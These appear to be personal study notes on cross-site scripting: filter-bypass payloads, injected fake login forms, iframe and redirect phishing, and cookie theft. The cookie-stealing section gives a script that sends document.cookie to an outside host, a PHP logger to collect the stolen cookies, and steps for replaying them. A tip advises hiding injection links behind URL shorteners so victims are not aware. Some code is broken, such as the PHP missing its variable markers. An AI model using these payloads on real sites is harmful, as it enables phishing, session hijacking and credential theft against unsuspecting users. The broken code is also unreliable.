[HERE](http://evuln.com/tools/xss-encoder/) to encode your XSS payloads

XSS Study notes:

**Reflected XSS:**  
Injecting mal script into a searchbox or at the end of the URL. Think of it like throwing a ball against a wall and it bouncing back.

**Stored XSS:**  
This is when an injected script is stored in the website eg a guestbook or posting board. These hit everyone who reach the site.

**DOM:**  
Document object model EG you put in user and pass, they get loaded into the dom and checked - the page itself never loads the code thus stopping traditional XSS

AJAX = asynchronous JavaScript (they change their contents by manipulating areas within the document object model)

**Tests:**
`<script>alert('1234');</script>`  
`<h1><font color="#00FF00">I like turtles</font></h1> ` 

### Bypasses:  
 **1. magic_quotes_gpc=ON bypass:**  
   * Bypass this by converting your text to decimal characters and place them inside the java function: `String.fromCharCode()`  
   * EG `<script>alert('1234');</script> = <script>alert(string.fromcharcode(49, 50, 51, 52));</script>`  

 **2. 'alert' filter bypass:**
   * Bypass this by converting your text to decimal characters and place them inside the java function:  
   `<script>eval(String.fromCharCode(97,108,101,114,116,40,39,<message_here>,39,41))</script>`
   `97,108,101,114,116,40,39,39,41` = `alert('')`
   
 **3. PHP htmlentities/script injection**
   * Considering: `<script>var $a= '';</script>` where htmlentities encodes crucial chars.  
   * Defeat with an injection - must end with declaring a var.
   `foo';alert(1);user='foo`
   
 **3. HEX encoding:**  
   * you can encode your payload as HEX, I could not get this to work, however this apparently is a valid bypass  
   
 **4. Obfuscation:**  
   * as a low level contrived example, some strings such as `"script","alert()","''"` as listed as bad words, so either sanitsed or
   * or handled with exceptions. Low level obfuscation can bypass: `<sCrIpT>alert('turtles');</ScRiPt>` (I KNOW IT'S LAME)  
   
 **5. filter escape:**  
   * Sometimes tags will be filtered/escaped/regexed etc - as a contrived example these can be defeated with strings such as `<sc<script>ript>alert(1)</sc</script>ript>` which will trick the sanitiser into pulling out "`<script>`" and then leave the "`<sc`" and "`ript>`" thus putting it back together **:)**
   
 **6. "Trying around"**  
   * Basically means just that, string different methods together, interupt search box HTML tags with `">` (this closes the tag)   
		
### Stuff we can do?

 **1. Inject a Phishing script**  
 **2. Iframe Phishing**  
 **3. Redirict Phishing**  
 **4. Cookie stealing**  


 **1. Phishing script injection: Inject a 'user' and 'password' field in html**  
(With the <html> and <body> tags), creating a false login field where the creds are harvested.  
`<html><body><head><meta content="text/html; charset=utf-8"></meta></head><div style="text-align: center;">`  
	
**Phishingpage:**``<br /><br/>Username :<br /> <input name="User" /><br />Password :<br />``  

`<input name="Password" type="password" /><br /><br /><input name="Valid" value="Ok !" type="submit" /><br /></form></div></body></html>`

 **2. Iframe Phishing:** 
Inject a javascript code containing an iframe where your phishing site is embeeded.  
Obviously it needs to look just like the target site.

`<iframe src="http://192.168.21.130/Facebook – log in or sign up.html" height="100%" width="100%"></iframe>`

 (Note: height="100%" width="100%" means that the whole window is filled with that iframe.)  
 The target site will spawn your phishing site in an Iframe, and the website user / victims won't see a difference and log in (If they're are foolish enough).  

 **3. Rediriction Phishing:**  
 Similar simple concept, inject a javascript rediriction script that leads to your phishingsite, make sure it looks the same.

Example:

   * `<script>document.location.href="http://www.yourphishingsite.ru"</script>`

   * `<META HTTP-EQUIV="refresh" CONTENT="0; URL="http://www.yorphishingsite.ru">`

   * `<img src=x onerror=this.src="http://10.10.10.154/admin/backdoorchecker.php?cmd=dirheck>`

**4. Cookie stealing:** 
A feared XSS flaw. Can be reflected or stored.

	  reflected (remember that if an attack does not work, play arouund with different parameters):
		<script> document.write("<iframe src='http://10.10.14.18:8000/test.html?cookie="+document.cookie+"'></iframe>");</script>

	  Stored:
     Place this cookiestealer.php in your hoster, and then inject javascript
     with your cookie stealer script embedded on your target website.

### Content of cookiestealer.php
```
<?php
cookie = HTTP_GET_VARS["cookie"];
file = fopen('log.txt', 'a');
fwrite(file, cookie . "nn");
fclose(file);
?>
```
 Save it as cookiestealer.php and create a 'log.txt' and upload both files
 on your own webspace, in the same directory and set "chmod 777".

 **Inject the following code in your target website:**

    http://www.site.ru/google.php?search=<script>location.href = 'http://192.168.21.130/stealcookie.php?cookie='+document.cookie;</script>

 Then the victim's cookie (target's website user who visited the url above) should
 appear in the log.txt.
 Now you simply need to insert the cookie (with e.g. live http headers firefox addon)
 and use it.

#############################################################
#                                                           #
# PROTIP FOR EVERY XSS INJECTION:                           #
# use url shortener services such as tinyurl.com or bit.ly  #
# to 'hide' your injection, so the victim won't know what's #
# behind that url.                                          #
#                                                           #
#############################################################

CSRF = check which links on page do what, and see if they are interesting enough to perform  CSRF
Quite often devs will obfuscate their code to prevent it being ripped off etc XMLhttpRequest video

In a well secured application < and > should be translated to &gt; and lt; - this is because html tags use these characters, so when they aren't filtered it opens an injection vector

Consider the below filters source after attempting an XSS attack - we can see that the single quote is not filtered
When heavy filtering is in place, one way we can inject code without the use of html tags is by using events. There are a number of events that fire in different places in a document/page when it is loaded
INPUT fields have three main events to attack: onChange, onFocus and onBlur.
```
onChange = fires when the value of an INPUT block changes
onFocus / onBlur = fire when the field is selected / when someone leaves the field
```

    <INPUT type="text" id="name" name="name" placeholder=
    'Full Name' class="form-control" autofocus="">

See how the placeholder contains single quotes? we can bypass filtering by closing the first quote, thus closing the field, setting the onFocus condition and then closing the second quote
Example: name field is `' onFocus='alert(1)` and address is `>asdf`


REMEMBER= that if the next page loads without code execution, as long as the input wasnt changed (eg you found a way to escape filtration) than there still may be a vulnerable element

bypassing regex

    var string = "Your registration of " + data["name"] + "<BR>" + data["address"] + "<BR>" + data["country"] + "<BR>was successful."

if we make name ```<script aaa=" and address ">window[alert](9);//``` - we escape the car string and execute our code

EXAMPLE of a more complex payload on a login page:

URL encode the below and set as a parameter in URL bar
```
" onmouseover="

document.forms[0].onsubmit = function demo () {
	var pass = document.forms[0].elements[1].value;

	alert(pass);
}
```

`<script>alert(document.ZG9tYWlu);</script>`

**SOMETIMES AN INPUT BOX IS HARDENED, IN THIS CASE TRY TO INSPECT ELEMENTS AND EDIT OPTIONS!!**

sometimes the first character needs to be escaped to html EG:

`&#34> <script>alert(document.domain);</script>`

When you cant "<" and ">", use events such as mouse over / onChange

`aaa" onmouseover="alert(document.domain); //` here we satisy what should be in input box, close with quote, specify another value and its event
successfully injected string as below:
`<input type="text" name="p1" size="50" value="aaa" onchange="alert(document.domain);">`



A function allowing creation of a link can be XSS attacked using the javascript schema, the link will execute code instead of loading site
javascript:alert(document.domain);


### Word filtering
when words are filtered out: Via the Stack Overflow question Base64 encoding and decoding in client-side Javascript we find that all modern browsers have a global function galled atob() to decode Base64 strings, read more on Mozilla Developer Network. To execute a string as JavaScript, use eval(). 

`"><script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));</script>`


If the words script, style and on aren't allowed, we have to think about something else this time. Apparently it's possible to encode JavaScript as Base64 and make it execute as an iframe src. From the Stack Overflow question Is it possible to "fake" the src attribute of an iframe? we can read that it's possible to do:

:::html
`<iframe src="data:text/html;base64, .... base64 encoded HTML data ....">`
Read more about data URIs on Mozilla Developer Network. The HTML data we want to use is:

:::html
`<script>parent.alert(document.domain);</script>`
parent. is needed because we want the alert to execute in the context of the parent's window. Encoding it as Base64 with the Character Encoding Calculator results in:

PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4
The code that we will then put into the search box to finish the level is:

:::html
`"><iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4="></iframe>`
